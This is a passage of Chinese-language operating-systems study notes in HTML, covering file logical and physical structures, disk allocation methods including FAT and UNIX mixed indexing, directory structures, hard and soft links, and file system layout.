<li><strong>密码</strong>：指用户对文件进行加密，文件被访问时需要使用密钥。这种方法保密性强，节省了存储空间，不过编码和译码要花费一定的时间</li>
</ul>
<p>口令和密码都是防止用户文件被他人存取或窃取，并没有控制用户对文件的访问类型。</p>
<div class="hint-container tip">
<p class="hint-container-title">注意两个问题</p>
<ul>
<li>现代操作系统常用的文件保护方法是，将访问控制列表与用户、组和其他成员访问控制方案一起组合使用</li>
<li>对于多级目录结构而言，不仅需要保护单个文件，而且需要保护子目录内的文件，即需要提供目录保护机制。目录操作与文件操作并不相同，因此需要不同的保护机制</li>
</ul>
</div>
</li>
</ol>
<h4> 文件的逻辑结构</h4>
<p>文件的逻辑结构是从用户观点出发看到的文件的组织形式。<a href="#%E6%96%87%E4%BB%B6%E7%9A%84%E7%89%A9%E7%90%86%E7%BB%93%E6%9E%84">文件的物理结构</a>（又称文件的存储结构）是从实现观点出发看到的文件在外存上的存储组织形式。文件的逻辑结构与存储介质特性无关，它实际上是指在文件的内部，数据逻辑上是如何组织起来的。</p>
<p>按逻辑结构，文件可划分为 <strong>无结构文件</strong> 和 <strong>有结构文件</strong> 两大类。</p>
<ol>
<li>
<p><strong>无结构文件（流式文件）</strong></p>
<p>无结构文件是最简单的文件组织形式。无结构文件将数据按顺序组织成记录并积累、保存，它是有序相关信息项的集合，以字节（Byte）为单位。由于无结构文件没有结构，因而对记录的访问只能通过穷举搜索的方式，因此这种文件形式对大多数应用不适用。但字符流的无结构文件管理简单，用户可以方便地对其进行操作。所以，那些对基本信息单位操作不多的文件较适于采用字符流的无结构方式，如：源程序文件、目标代码文件等。</p>
</li>
<li>
<p><strong>有结构文件（记录式文件）</strong></p>
<p>有结构文件按记录的组织形式可以分为如下几种：</p>
<ul>
<li>
<p><strong>顺序文件</strong></p>
<p>文件中的记录一个接一个地顺序排列，记录通常是定长的，可以顺序存储或以链表形式存储。顺序文件有以下两种结构：第一种是 <strong>串结构</strong>，记录之间的顺序与关键字无关，通常是按存入时间的先后进行排列，对串结构文件进行检索必须从头开始顺序依次查找，比较费时。第二种是 <strong>顺序结构</strong>，指文件中的所有记录按关键字顺序排列，可采用折半查找法，提高了检索效率。</p>
<p>在对记录进行批量操作，即每次要读或写一大批记录时，顺序文件的效率是所有逻辑文件中最高的。此外，对于顺序存储设备（如：磁带），也只有顺序文件才能被存储并能有效地工作。在经常需要查找、修改、增加或删除单个记录的场合，顺序文件的性能也比较差。</p>
</li>
<li>
<p><strong>索引文件</strong></p>
<p>对于定长记录文件，要查找第 <code>i</code> 条记录，可直接根据下式计算得到第 <code>i</code> 条记录相对于第 <code>1</code> 条记录的地址：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mo>=</mo><mi>i</mi><mo>×</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">A_{i} = i \times L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span>。然而，对于可变长记录的文件，要查找第 <code>i</code> 条记录，必须顺序地查找前 <code>i - 1</code> 条记录，从而获得相应记录的长度 <code>L</code>，进而按下式计算出第 <code>i</code> 条记录的首址：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></munderover><msub><mi>L</mi><mi>i</mi></msub><mo>+</mo><mn>1</mn></mstyle></mrow><annotation encoding="application/x-tex">A_{i} = \displaystyle\sum_{i=0}^{i-1} L_{i} + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0893em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8117em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>假定每条记录前用一个字节指明该记录的长度</p>
</div>
<p>变长记录文件只能顺序查找，效率较低。为此，可以建立一张索引表，为主文件的每个记录在索引表中分别设置一个表项，包含指向变长记录的指针（即逻辑起始地址）和记录长度，索引表按关键字排序，因此其本身也是一个定长记录的顺序文件。这样就把对变长记录顺序文件的检索转变为对定长记录索引文件的随机检索，从而加快了记录的检索速度。</p>
</li>
<li>
<p><strong>索引顺序文件</strong></p>
<p>索引顺序文件是顺序文件和索引文件的结合。最简单的索引顺序文件只使用了一级索引。索引顺序文件将顺序文件中的所有记录分为若干组，为顺序文件建立一张索引表，在索引表中为每组中的第一条记录建立一个索引项，其中含有该记录的关键字值和指向该记录的指针。</p>
<p>索引文件和索引顺序文件都提高了存取的速度，但因为配置索引表而增加了存储空间。</p>
</li>
<li>
<p><strong>直接文件或散列文件（Hash File）</strong></p>
<p>给定记录的键值或通过散列函数转换的键值直接决定记录的物理地址。这种映射结构不同于顺序文件或索引文件，没有顺序的特性。散列文件有很高的存取速度，但是会引起冲突，即不同关键字的散列函数值相同。</p>
</li>
</ul>
<p>有结构文件逻辑上的组织，是为在文件中查找数据服务的（顺序查找、索引查找、索引顺序查找、哈希查找）。</p>
</li>
</ol>
<h4> 文件的物理结构</h4>
<p>文件的物理结构就是研究文件的实现，即 <strong>文件数据在物理存储设备上是如何分布和组织的</strong>。同一个问题有两个方面的回答：一是文件的分配方式，讲的是对磁盘非空闲块的管理；二是文件存储空间管理，讲的是对磁盘空闲块的管理。</p>
<p>文件分配对应于文件的物理结构，是指如何为文件分配磁盘块。<strong>常用的磁盘空间分配方法有三种</strong>：连续分配、链接分配和索引分配。有的系统（如：RDOS 操作系统）对三种方法都支持，但更普遍的是一个系统只支持一种方法。</p>
<ol>
<li>
<p><strong>连续分配</strong></p>
<p>连续分配方法要求 <strong>每个文件在磁盘上占有一组连续的块</strong>。磁盘地址定义了磁盘上的一个线性排序，这种排序使作业访问磁盘时需要的寻道数和寻道时间最小。</p>
<p>采用连续分配时，逻辑文件中的记录也顺序存储在相邻接的块中。一个文件的目录项中 “文件物理地址” 字段应包括第一块的地址和该文件所分配区域的长度，若文件长 <code>n</code> 块并从位置 <code>b</code> 开始，则该文件将占有块 <code>b, b + 1, b + 2, …, b + n - 1</code>。</p>
<p>连续分配支持顺序访问和直接访问。<strong>优点</strong> 是实现简单、存取速度快。<strong>缺点</strong>是：文件长度不宜动态增加，因为一个文件末尾后的盘块可能已分配给其他文件，一且需要增加，就需要大量移动盘块；为保持文件的有序性，删除和插入记录时，需要对相邻的记录做物理上的移动，还会动态改变文件的长度；反复增删文件后会产生外部碎片（与内存管理分配方式中的碎片相似）；很难确定一个文件需要的空间大小，因而只适用于长度固定的文件。</p>
</li>
<li>
<p><strong>链接分配</strong></p>
<p>链接分配是一种 <strong>采用离散分配的方式</strong>。它消除了磁盘的外部碎片，提高了磁盘的利用率。可以动态地为文件分配盘块，因此无须事先知道文件的大小。此外，对文件的插入、删除和修改也非常方便。链接分配又可分为隐式链接和显式链接两种形式。</p>
<ul>
<li>
<p><strong>隐式链接</strong></p>
<p>目录项中含有文件第一块的指针和最后一块的指针。每个文件对应一个磁盘块的链表；磁盘块分布在磁盘的任何地方，除最后一个盘块外，每个盘块都含有指向文件下一个盘块的指针，这些指针对用户是透明的。</p>
<p>隐式链接的 <strong>缺点</strong> 是只适合顺序访问，若要访问文件的第 <code>i</code> 个盘块，则只能从第 <code>1</code> 个盘块开始通过盘块指针顺序查找到第 <code>i</code> 块，随机访问效率很低。隐式链接的稳定性也是一个问题，系统在运行过程中由于软件或硬件错误导致链表中的指针丢失或损坏，会导致文件数据的丢失。</p>
<p>通常的解决方案是，将几个盘块组成簇（cluster），按簇而不按块来分配，可以成倍地减少查找时间。比如一簇为 <code>4</code> 块，这样，指针所占的磁盘空间比例也要小得多。这种方法的代价是增加了内部碎片。簇可以改善许多算法的磁盘访问时间，因此应用于大多数操作系统。</p>
</li>
<li>
<p><strong>显式链接</strong></p>
<p>显式链接是指把用于链接文件各物理块的指针，从每个物理块的末尾中提取出来，显式地存放在内存的一张链接表中。该表在整个磁盘中仅设置一张，称为 <strong>文件分配表（File Allocation Table，FAT）</strong>。每个表项中存放链接指针，即下一个盘块号。文件的第一个盘块号记录在目录项 “物理地址” 字段中，后续的盘块可通过查 <code>FAT</code> 找到。例如：某磁盘共有 <code>100</code> 个磁盘块，存放了两个文件：文件 “aaa” 占三个盘块，依次是 2→8→5；文件 “bbb” 占两个盘块，依次是 7→1。其余盘块都是空闲盘块。</p>
<p>不难看出，文件分配表 <code>FAT</code> 的表项与全部磁盘块一一对应，并且可以用一个特殊的数字 <code>-1</code> 表示文件的最后一块，可以用 <code>-2</code> 表示这个磁盘块是空闲的（当然也可指定为 <code>-3,-4</code>）。因此，<code>FAT</code> 不仅记录了文件各块之间的先后链接关系，同时还标记了空闲的磁盘块，操作系统也可以通过 <code>FAT</code> 对文件存储空间进行管理。当某进程请求操作系统分配一个磁盘块时，操作系统只需从 <code>FAT</code> 中找到 <code>-2</code> 的表项，并将对应的磁盘块分配给进程即可。</p>
<p><code>FAT</code> 表在系统启动时就会被读入内存，因此查找记录的过程是在内存中进行的，因而不仅显著地提高了检索速度，而且明显减少了访问磁盘的次数。</p>
</li>
</ul>
</li>
<li>
<p><strong>索引分配</strong></p>
<p>链接分配解决了连续分配的外部碎片和文件大小管理的问题。但依然存在问题：链接分配不能有效支持直接访问（FAT 除外）；<code>FAT</code> 需要占用较大的内存空间。事实上，在打开某个文件时，只需将该文件对应盘块的编号调入内存即可，完全没有必要将整个 <code>FAT</code> 调入内存。为此，索引分配将每个文件所有的盘块号都集中放在一起构成索引块（表）。</p>
<p>每个文件都有其索引块，这是一个磁盘块地址的数组。索引块的第 <code>i</code> 个条目指向文件的第 <code>i</code> 个块。要读第 <code>i</code> 块，通过索引块的第 <code>i</code> 个条目的指针来查找和读入所需的块。</p>
<p>索引分配的 <strong>优点</strong> 是支持直接访问，且没有外部碎片问题。<strong>缺点</strong> 是由于索引块的分配，增加了系统存储空间的开销。索引块的大小是一个重要的问题，每个文件必须有一个索引块，因此索引块应尽可能小，但索引块太小就无法支持大文件。可以采用以下机制来处理这个问题。</p>
<ul>
<li><strong>链接方案</strong>：一个索引块通常为一个磁盘块，因此它本身能直接读写。为了支持大文件，可以将多个索引块链接起来</li>
<li><strong>多层索引</strong>：通过第一级索引块指向一组第二级的索引块，第二级索引块再指向文件块。查找时，通过第一级索引查找第二级索引，再采用这个第二级索引查找所需数据块。这种方法根据最大文件大小，可以继续到第三级或第四级。例如：<code>4096B</code> 的块，能在索引块中存入 <code>1024</code> 个 <code>4B</code> 的指针。两级索引支持 <code>1048576</code> 个数据块，即支持最大文件为 <code>4GB</code></li>
<li><strong>混合索引</strong>：将多种索引分配方式相结合的分配方式。例如：系统既采用直接地址，又采用单级索引分配方式或两级索引分配方式</li>
</ul>
<p>此外，访问文件需两次访问外存，先读取索引块的内容，然后访问具体的磁盘块，因而降低了文件的存取速度。为了解决这一问题，通常将文件的索引块读入内存，以提高访问速度。</p>
</li>
<li>
<p><strong>混合索引分配</strong></p>
<p>为了能够较全面地照顾到小型、中型、大型和特大型文件，可采用混合索引分配方式。对于小文件，为了提高对众多小文件的访问速度，最好能将它们的每个盘块地址直接放入 <code>FCB</code>，这样就可以直接从 <code>FCB</code> 中获得该文件的盘块地址，即为直接寻址。对于中型文件，可以采用单级索引方式，需要先从 <code>FCB</code> 中找到该文件的索引表，从中获得该文件的盘块地址，即为一次间址。对于大型或特大型文件，可以采用两级和三级索引分配方式。UNIX 系统采用的就是这种分配方式，在其索引结点中，共设有 <code>13</code> 个地址项，即 <code>i.addr(0)~i.addr(12)</code>。</p>
<ul>
<li><strong>直接地址</strong>：为了提高对文件的检索速度，在索引结点中可设置 <code>10</code> 个直接地址项，即用 <code>i.addr(0)~i.addr(9)</code> 来存放直接地址，即文件数据盘块的盘块号。假如每个盘块的大小为 <code>4KB</code>，当文件不大于 <code>40KB</code>时，便可直接从索引结点中读出该文件的全部盘块号</li>
<li><strong>一次间接地址</strong>：对于中、大型文件，只采用直接地址并不现实的。为此，可再利用索引结点中的地址项 <code>i.addr(10)</code> 来提供一次间接地址。这种方式的实质就是一级索引分配方式。一次间址块也就是索引块，系统将分配给文件的多个盘块号记入其中。在一次间址块中可存放 <code>1024</code> 个盘块号，因而允许文件长达 <code>4MB</code></li>
<li><strong>多次间接地址</strong>：当文件长度大于 <code>4MB + 40KB</code>（一次间接地址与 <code>10</code> 个直接地址项）时，系统还需采用二次间接地址分配方式。这时，用地址项 <code>i.addr(11)</code> 提供二次间接地址。该方式的实质是两级索引分配方式。系统此时在二次间址块中记入所有一次间址块的盘号。地址项 <code>i.addr(11)</code> 作为二次间址块，允许文件最大长度可达 <code>4GB</code>。同理，地址项 <code>i.addr(12)</code> 作为三次间址块，其允许的文件最大长度可达 <code>4TB</code></li>
</ul>
</li>
</ol>
<h3> 目录</h3>
<h4> 目录的基本概念</h4>
<p><code>FCB</code> 的有序集合称为文件目录，一个 <code>FCB</code> 就是一个文件目录项。<strong>与文件管理系统和文件集合相关联的是文件目录</strong>，它包含有关文件的属性、位置和所有权等。</p>
<p>首先来看目录管理的基本要求：从用户的角度看，目录在用户（应用程序）所需要的文件名和文件之间提供一种映射，所以目录管理要实现 “按名存取”；目录存取的效率直接影响到系统的性能，所以要提高对目录的检索速度；在多用户系统中，应允许多个用户共享一个文件，因此目录还需要提供用于控制访问文件的信息。此外，应允许不同用户对不同文件采用相同的名字，以便于用户按自己的习惯给文件命名，目录管理通过树形结构来解决和实现。</p>
<h4> 目录结构</h4>
<ol>
<li>
<p><strong>单级目录结构</strong></p>
<p>在整个文件系统中只建立一张目录表，每个文件占一个目录项。</p>
<p>当访问一个文件时，先按文件名在该目录中查找到相应的 <code>FCB</code>，经合法性检查后执行相应的操作。当建立一个新文件时，必须先检索所有目录项，以确保没有 “重名” 的情况，然后在该目录中增设一项，把新文件的属性信息填入到该项中。当删除一个文件时，先从该目录中找到该文件的目录项，回收该文件所占用的存储空间，然后清除该目录项。</p>
<p>单级目录结构实现了 “按名存取”，但是存在查找速度慢、文件不允许重名、不便于文件共享等缺点，而且对于多用户的操作系统显然是不适用的。</p>
</li>
<li>
<p><strong>两级目录结构</strong></p>
<p>为了克服单级目录所存在的缺点，可以采用两级方案，将文件目录分成 <strong>主文件目录（MasterFile Directory，MFD）</strong> 和 <strong>用户文件目录（User File Directory，UFD）</strong> 两级。</p>
<p>主文件目录项记录用户名及相应用户文件目录所在的存储位置。用户文件目录项记录该用户文件的 <code>FCB</code> 信息。当某用户欲对其文件进行访问时，只需搜索该用户对应的 <code>UFD</code>，这既解决了不同用户文件的 “重名” 问题，又在一定程度上保证文件的安全。</p>
<p>两级目录结构提高了检索的速度，解决了多用户之间的文件重名问题，文件系统可以在目录上实现访问限制。但是两级目录结构缺乏灵活性，不能对文件分类。</p>
</li>
<li>
<p><strong>树形目录结构</strong></p>
<p>将两级目录结构加以推广，就形成了树形目录结构。它可以明显地 <strong>提高对目录的检索速度和文件系统的性能</strong>。当用户要访问某个文件时，用文件的路径名标识文件，文件路径名是个字符串，由从根目录出发到所找文件通路上所有目录名与数据文件名用分隔符 <code>/</code> 链接而成。<strong>从根目录出发的路径称为绝对路径</strong>。当层次较多时，每次从根目录查询会浪费时间，于是加入了当前目录（又称工作目录），进程对各文件的访问都是相对于当前目录进行的。当用户要访问某个文件时，使用相对路径标识文件，<strong>相对路径由从当前目录出发到所找文件通路上所有目录名与数据文件名用分隔符 <code>/</code> 链接而成。</strong></p>
<p>例如：Linux 操作系统的目录结构，<code>/dev/hda</code> 就是一个绝对路径。若当前目录为 <code>/bin</code>，则 <code>./ls</code> 就是一个相对路径，其中符号 <code>./</code> 表示当前工作目录。</p>
<p>通常，每个用户都有各自的 “当前目录”，登录后自动进入该用户的 “当前目录”。操作系统提供一条专门的系统调用，供用户随时改变 “当前目录”。例如：在 UNIX 系统中，<code>/etc/passwd</code> 文件就包含有用户登录时默认的 “当前目录”，可用 <code>cd</code> 命令改变 “当前目录”。</p>
<p>树形目录结构可以很方便地对文件进行分类，层次结构清晰，也能够更有效地进行文件的管理和保护。在树形目录中，不同性质、不同用户的文件，可以分别呈现在系统目录树的不同层次或不同子树中，很容易地赋予不同的存取权限。但是，在树形目录中查找一个文件，需要按路径名逐级访问中间结点，增加了磁盘访问次数，这无疑会影响查询速度。目前，大多数操作系统如：UNIX、Linux 和 Windows 系统都采用了树形文件目录。</p>
</li>
<li>
<p><strong>无环图目录结构</strong></p>
<p>树形目录结构能便于实现文件分类，但不便于实现文件共享，为此在树形目录结构的基础上增加了一些指向同一结点的有向边，使整个目录成为一个有向无环图。</p>
<p>当某用户要求删除一个共享结点时，若系统只是简单地将它删除，则当另一共享用户需要访问时，会因无法找到这个文件而发生错误。为此，可为每个共享结点设置一个共享计数器，每当增加对该结点的共享链时，计数器加 <code>1</code>；每当某用户提出删除该结点时，计数器减 <code>1</code>。仅当共享计数器为 <code>0</code> 时，才真正删除该结点，否则仅删除请求用户的共享链。</p>
<p>共享文件（或目录）不同于文件拷贝（副本）。若有两个文件拷贝，则每个程序员看到的是拷贝而不是原件；然而，若一个文件被修改，则另一个程序员的拷贝不会改变。对于共享文件，只存在一个真正的文件，任何改变都会为其他用户所见。</p>
<p>无环图目录结构方便地实现了文件的共享，但使得系统的管理变得更加复杂。</p>
</li>
</ol>
<h4> 目录的操作</h4>
<p>对目录所需要执行的操作如下：</p>
<ul>
<li><strong>搜索</strong>：当用户使用一个文件时，需要搜索目录，以找到该文件的对应目录项</li>
<li><strong>创建文件</strong>：当创建一个新文件时，需要在目录中增加一个目录项</li>
<li><strong>删除文件</strong>：当删除一个文件时，需要在目录中删除相应的目录项</li>
<li><strong>创建目录</strong>：在树形目录结构中，用户可创建自己的用户文件目录，并可再创建子目录</li>
<li><strong>删除目录</strong>：有两种方式：不删除非空目录，删除时要先删除目录中的所有文件，并递归地删除子目录；可删除非空目录，目录中的文件和子目录同时被删除</li>
<li><strong>移动目录</strong>：将文件或子目录在不同的父目录之间移动，文件的路径名也会随之改变</li>
<li><strong>显示目录</strong>：用户可以请求显示目录的内容，如显示该用户目录中的所有文件及属性</li>
<li><strong>修改目录</strong>：某些文件属性保存在目录中，因而这些属性的变化需要改变相应的目录项</li>
</ul>
<h4> 目录实现</h4>
<p>在访问一个文件时，操作系统利用路径名找到相应目录项，目录项中提供了查找文件磁盘块所需要的信息。目录实现的基本方法有线性列表和哈希表两种，要注意 <strong>目录的实现就是为了查找，因此线性列表实现对应线性查找，哈希表的实现对应散列查找。</strong></p>
<ol>
<li>
<p><strong>线性列表</strong></p>
<p>线性列表采用文件名和数据块指针。当创建新文件时，必须首先搜索目录以确定没有同名的文件存在，然后在目录中增加一个新的目录项。当删除文件时，则根据给定的文件名搜索目录，然后释放分配给它的空间。当要重用目录项时有许多种方法：可以将目录项标记为不再使用，或将它加到空闲目录项的列表上，还可以将目录的最后一个目录项复制到空闲位置，并减少目录的长度。采用链表结构可以减少删除文件的时间。</p>
<p>线性列表的优点在于实现简单，不过由于线性表的特殊性，查找比较费时。</p>
</li>
<li>
<p><strong>哈希表</strong></p>
<p>哈希表根据文件名得到一个值，并返回一个指向线性列表中元素的指针。这种方法的优点是查找非常迅速，插入和删除也较简单，不过需要一些措施来避免冲突（两个文件名称哈希到同一位置）。</p>
<p>目录查询是通过在磁盘上反复搜索完成的，需要不断地进行 <code>I/O</code> 操作，开销较大。所以如前所述，为了减少 <code>I/O</code> 操作，把当前使用的文件目录复制到内存，以后要使用该文件时只需在内存中操作，因此降低了磁盘操作次数，提高了系统速度。</p>
</li>
</ol>
<h4> 文件共享</h4>
<p>文件共享使多个用户共享同一个文件，系统中只需保留该文件的一个副本。若系统不能提供共享功能，则每个需要该文件的用户都要有各自的副本，会造成对存储空间的极大浪费。</p>
<p><strong>现代常用的两种文件共享方法如下：</strong></p>
<ol>
<li>
<p><strong>基于索引结点的共享方式（硬链接）</strong></p>
<p>在树形结构的目录中，当有两个或多个用户要共享一个子目录或文件时，必须将共享文件或子目录链接到两个或多个用户的目录中，才能方便地找到该文件。</p>
<p>在这种共享方式中，诸如文件的物理地址及其他的文件属性等信息，不再放在目录项中，而放在索引结点中。在文件目录中只设置文件名及指向相应索素引结点的指针。在索引结点中还应有一个链接计数 <code>count</code>，用于表示链接到本索引结点（即文件）上的用户目录项的数目。当 <code>count = 2</code> 时，表示有两个用户目录项链接到本文件上，或者说有两个用户共享此文件。</p>
</li>
<li>
<p><strong>利用符号链实现文件共享（软链接）</strong></p>
<p>为使用户 B 能共享用户 A 的一个文件 F，可以由系统创建一个 LINK 类型的新文件，也取名为 F，并将该文件写入用户 B 的目录中，以实现用户 B 的目录与文件 F 的链接。在新文件中只包含被链接文件 F 的路径名。当用户 B 要访问被链接的文件 F 且正要读 LINK 类新文件时，操作系统查看到要读的文件是 LINK 类型，则根据该文件中的路径名去找到文件 F，然后对它进行读，从而实现用户 B 对文件 F 的共享。这样的链接方法被称为符号链接。</p>
<p>在利用符号链方式实现文件共享时，只有文件主才拥有指向其索引结点的指针。而共享该文件的其他用户只有该文件的路径名，并不拥有指向其索引结点的指针。这样，也就不会发生在文件主删除一共享文件后留下一悬空指针的情况。当文件主把一个共享文件删除后，若其他用户又试图通过符号链去访问它时，则会访问失败，于是将符号链删除，此时不会产生任何影响。</p>
<p>在符号链的共享方式中，当其他用户读共享文件时，系统根据文件路径名逐个查找目录，直至找到该文件的索引结点。因此，每次访问共享文件时，都可能要多次地读盘。使得访问文件的开销甚大，且增加了启动磁盘的频率。此外，符号链的索引结点也要耗费一定的磁盘空间。</p>
<p>利用符号链实现网络文件共享时，只需提供该文件所在机器的网络地址及文件路径名。</p>
</li>
</ol>
<p>硬链接和软链接都是文件系统中的静态共享方法，在文件系统中还存在着另外的共享需求，即两个进程同时对同一个文件进行操作，这样的共享称为动态共享。</p>
<p>硬链接就是多个指针指向一个索引结点，保证只要还有一个指针指向索引结点，索引结点就不能删除；软链接就是把到达共享文件的路径记录下来，当要访问文件时，根据路径寻找文件。可见，硬链接的查找速度要比软链接的快。</p>
<h3> 文件系统</h3>
<h4> 文件系统结构</h4>
<p>文件系统（File system）提供高效和便捷的磁盘访问，以便允许存储、定位、提取数据。文件系统有两个不同的设计问题：第一个问题是，定义文件系统的用户接口，它涉及定义文件及其属性、所允许的文件操作、如何组织文件的目录结构。第二个问题是，创建算法和数据结构，以便映射逻辑文件系统到物理外存设备。现代操作系统有多种文件系统类型，因此文件系统的层次结构也不尽相同。<strong>下图是一个合理的文件系统层次结构。</strong></p>
<figure><figcaption>文件系统层次结构</figcaption></figure>
<ul>
<li>
<p><strong>I/O 控制</strong></p>
<p>包括设备驱动程序和中断处理程序，在内存和磁盘系统之间传输信息。设备驱动程序将输入的命令翻译成底层硬件的特定指令，硬件控制器利用这些指令使 <code>I/O</code> 设备与系统交互。设备驱动程序告诉 <code>I/O</code> 控制器对设备的什么位置采取什么动作。</p>
</li>
<li>
<p><strong>基本文件系统</strong></p>
<p>向对应的设备驱动程序发送通用命令，以读取和写入磁盘的物理块。每个物理块由磁盘地址标识。该层也管理内存缓冲区，并保存各种文件系统、目录和数据块的缓存。在进行磁盘块传输前，分配合适的缓冲区，并对缓冲区进行管理。管理它们对于系统性能的优化至关重要。</p>
</li>
<li>
<p><strong>文件组织模块</strong></p>
<p>组织文件及其逻辑块和物理块。文件组织模块可以将逻辑块地址转换成物理块地址，每个文件的逻辑块从 <code>0</code> 到 <code>N</code> 编号，它与数据的物理块不匹配，因此需要通过转换来定位。文件组织模块还包括空闲空间管理器，以跟踪未分配的块，根据需求提供给文件组织模块。</p>
</li>
<li>
<p><strong>逻辑文件系统</strong></p>
<p>用于管理元数据信息。元数据包括文件系统的所有结构，而不包括实际数据（或文件内容）。逻辑文件系统管理目录结构，以便根据给定文件名称为文件组织模块提供所需要的信息。它通过文件控制块来维护文件结构。逻辑文件系统还负责文件保护。</p>
</li>
</ul>
<h4> 文件系统布局</h4>
<ol>
<li>
<p><strong>文件系统在磁盘中的结构</strong></p>
<p>文件系统存放在磁盘上，多数磁盘划分为一个或多个分区，每个分区中有一个独立的文件系统。文件系统可能包括如下信息：启动存储在那里的操作系统的方式、总的块数、空闲块的数量和位置、目录结构以及各个具体文件等。<strong>下图为一个可能的文件系统布局。</strong></p>
<figure><figcaption>文件系统布局</figcaption></figure>
<ul>
<li><strong>主引导记录（Master Boot Record，MBR）</strong>：位于磁盘的 <code>0</code> 号扇区，用来引导计算机，<code>MBR</code> 后面是分区表，该表给出每个分区的起始和结束地址。表中的一个分区被标记为活动分区，当计算机启动时，<code>BIOS</code> 读入并执行 <code>MBR</code>。<code>MBR</code> 做的第一件事是确定活动分区，读入它的第一块，即引导块</li>
<li><strong>引导块（boot block）</strong>：<code>MBR</code> 执行引导块中的程序后，该程序负责启动该分区中的操作系统。为统一起见，每个分区都从一个引导块开始，即使它不含有一个可启动的操作系统，也不排除以后会在该分区安装一个操作系统。Windows 系统称之为分区引导扇区。除了从引导块开始，磁盘分区的布局是随着文件系统的不同而变化的。文件系统经常包含有如上图所列的一些项目</li>
<li><strong>超级块（super block）</strong>：包含文件系统的所有关键信息，在计算机启动时，或者在该文件系统首次使用时，超级块会被读入内存。超级块中的典型信息包括分区的块的数量、块的大小、空闲块的数量和指针、空闲的 <code>FCB</code> 数量和 <code>FCB</code> 指针等</li>
<li><strong>文件系统中空闲块的信息</strong>：可以使用位示图或指针链接的形式给出。后面也许跟的是一组 <code>i</code> 结点，每个文件对应一个结点，<code>i</code> 结点说明了文件的方方面面。接着可能是根目录，它存放文件系统目录树的根部。最后，磁盘的其他部分存放了其他所有的目录和文件</li>
</ul>
</li>
<li>
<p><strong>文件系统在内存中的结构</strong></p>
<p>内存中的信息用于管理文件系统并通过缓存来提高性能。这些数据在安装文件系统时被加载，在文件系统操作期间被更新，在卸载时被丢弃。<strong>这些结构的类型可能包括：</strong></p>
<ul>
<li>内存中的安装表（mount table），包含每个已安装文件系统分区的有关信息</li>
<li>内存中的目录结构的缓存包含最近访问目录的信息。对安装分区的目录，它可以包括一个指向分区表的指针</li>
<li>整个系统的打开文件表，包含每个打开文件的 <code>FCB</code> 副本及其他信息</li>
<li>每个进程的打开文件表，包含一个指向整个系统的打开文件表中的适当条目的指针，以及其他信息</li>
</ul>
